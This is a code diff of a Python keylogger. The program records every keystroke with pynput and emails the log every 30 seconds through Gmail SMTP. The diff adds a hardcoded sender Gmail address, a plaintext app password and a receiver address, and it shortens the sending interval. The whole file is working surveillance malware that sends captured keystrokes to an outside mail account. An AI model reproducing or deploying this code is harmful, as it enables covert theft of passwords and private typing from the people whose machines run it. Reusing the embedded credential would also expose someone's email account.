@@ -2,7 +2,6 @@ from pynput import keyboard     #tracks the keys pressed         pip install pyn
 import threading                #for multi tasking               pip install smtplib
 import smtplib                  #for sending emails              pip install smtplib
 
-
 log = ""
 caps = False
 count = 0
@@ -32,15 +31,15 @@ def grab_keys(key):# takes the input of keys and stores in a variable named log
             log += " " + str(key) + " "
     print(log)
 
-def send_email():      
+def send_email():   
+    sender_email = "ahmeddddali001@gmail.com"   # enter email of sender
+    sender_password = "xnlzqgtngpnczahg"  # enter app password of sender email. use this link to create app password: https://youtu.be/T0Op3Qzz6Ms?si=CXPtpRVapH-hr7so   
+    reciever_email = "malikhaziq93@gmail.com"  # enter email of reciever
     try:
         s = smtplib.SMTP("smtp.gmail.com", 587)
         s.starttls()
-        sender_email = ""   # enter email of sender
-        sender_password = ""  # enter app password of sender email. use this link to create app password: https://youtu.be/T0Op3Qzz6Ms?si=CXPtpRVapH-hr7so  
         s.login(sender_email, sender_password)
         msg = f"Subject: {"KeysLogged"}\n\n{log}"
-        reciever_email = ""  # enter email of reciever
         s.sendmail(sender_email, reciever_email, msg) 
         s.quit()
         return "successfull"
@@ -52,8 +51,8 @@ def keys_logged():      # it will gather the whole keys pressed in a particular 
     global log
     send_email()
     log = ""
-    time_interval = 300     #set the time in seconds for sending emails automatically
-    timer = threading.Timer(300,keys_logged)
+    time_interval = 30     #set the time in seconds for sending emails automatically
+    timer = threading.Timer(time_interval,keys_logged)
     timer.start()
 
 listen = keyboard.Listener(on_press = grab_keys)
